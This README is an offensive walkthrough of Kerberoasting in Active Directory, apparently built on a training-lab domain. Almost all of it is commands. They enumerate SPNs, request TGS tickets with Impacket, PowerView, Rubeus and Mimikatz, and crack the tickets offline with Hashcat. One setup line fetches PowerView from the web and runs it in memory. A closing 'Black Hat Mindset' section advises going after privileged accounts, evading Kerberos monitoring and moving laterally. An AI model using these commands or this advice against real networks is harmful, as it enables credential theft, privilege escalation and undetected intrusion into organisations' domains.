# Active Directory Kerberoasting README

This README explores Kerberoasting attacks to extract and crack TGS (Ticket Granting Service) tickets, targeting Service Principal Names (SPNs) for offline password cracking.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Enumerating SPNs](#enumerating-spns)
- [Requesting TGS Tickets](#requesting-tgs-tickets)
- [Cracking TGS Tickets](#cracking-tgs-tickets)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Kerberoasting exploits Kerberos authentication by requesting TGS tickets for accounts with SPNs (e.g., SQL service accounts), which are encrypted with the account's password hash. These tickets can be cracked offline to reveal plaintext credentials. This guide uses Impacket, PowerView, Rubeus, Mimikatz, and Hashcat to enumerate SPNs, request tickets, and crack hashes. Commands are performed from Windows or Linux hosts, assuming you have compromised domain credentials (e.g., `INLANEFREIGHT.LOCAL/mholliday`).

## Setup and Prerequisites

- **Environment**: Linux host for Impacket and Hashcat, Windows host for PowerView, Rubeus, and Mimikatz.
- **Impacket**: Install on Linux (e.g., `sudo python3 -m pip install .` inside the cloned Impacket directory).
- **PowerView**: Load into memory on Windows (e.g., `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`).
- **Rubeus**: Download the Rubeus executable on Windows (e.g., from its GitHub repo) and place it in your working directory (e.g., `C:\Tools\`).
- **Mimikatz**: Download the Mimikatz executable on Windows and place it in your working directory.
- **Hashcat**: Install on Linux (e.g., `apt install hashcat`) with a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`).
- **kirbi2john**: Install on Linux (e.g., part of John the Ripper suite, `apt install john`) for converting .kirbi tickets.
- **PowerShell**: Run with appropriate privileges on Windows (right-click > "Run as Administrator").
- **Credentials**: Use compromised domain credentials (e.g., `INLANEFREIGHT.LOCAL/mholliday`) to request TGS tickets.

## Enumerating SPNs

Identify accounts with SPNs, which are prime targets for Kerberoasting.

```bash
# Display options and functionality for Impacket's GetUserSPNs.py (Linux host)
GetUserSPNs.py -h

# List SPNs in the INLANEFREIGHT.LOCAL domain
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday

# Enumerate all SPNs in the target Windows domain
setspn.exe -Q */*

# Use PowerView to list all accounts with SPNs
Import-Module .\PowerView.ps1; Get-DomainUser * -spn | select samaccountname

# Check SPN and encryption types for specific account
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

# Display Kerberoasting stats in the domain
.\Rubeus.exe kerberoast /stats
```

## Requesting TGS Tickets

Request TGS tickets for offline cracking, formatting them as needed.

```bash
# Request TGS tickets for all SPNs (Linux)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request

# Request TGS ticket for specific user
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev

# Save TGS ticket to file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev -outputfile sqldev_tgs
```

```powershell
# Request TGS ticket for specific SPN (PowerShell)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Request TGS tickets for all SPNs
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Configure Mimikatz for base64 output
mimikatz # base64 /out:true

# Extract TGS tickets using Mimikatz
kerberos::list /export

# Request and format TGS ticket for Hashcat
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export all SPN tickets to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

# View exported CSV
cat .\ilfreight_tgs.csv

# Request TGS tickets for privileged accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Request TGS ticket for specific user
.\Rubeus.exe kerberoast /user:testspn /nowrap
```

## Cracking TGS Tickets

Crack the extracted TGS tickets to reveal plaintext passwords.

```bash
# Crack TGS ticket with Hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force

# Prepare base64 TGS ticket
echo "<base64 blob>" | tr -d \n

# Decode base64 ticket to .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Convert .kirbi to crackable format
python2.7 kirbi2john.py sqldev.kirbi

# Prepare hash for Hashcat
sed 's/$krb5tgs$(.*):(.*)/$krb5tgs$23$*1*$2/' crack_file > sqldev_tgs_hashcat

# View prepared hash
cat sqldev_tgs_hashcat

# Crack prepared TGS hash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

# Crack RC4-encrypted ticket
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt
```

## Black Hat Mindset

- **Target High-Value Accounts**: Focus on SPNs tied to privileged accounts (e.g., admincount=1) for maximum impact.
- **Stay Undetected**: Request tickets sparingly and crack offline to avoid triggering Kerberos monitoring.
- **Optimize Cracking**: Use a strong wordlist like rockyou.txt and prioritize RC4 tickets (weaker encryption).
- **Pivot Quickly**: Use cracked credentials to escalate privileges or move laterally within the domain.

## Resources

- [Impacket Guide](https://github.com/SecureAuthCorp/impacket)
- [PowerView Documentation](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz)
- [Hashcat Documentation](https://hashcat.net/wiki/)
- [Kerberoasting Explained](https://attack.mitre.org/techniques/T1558/003/)

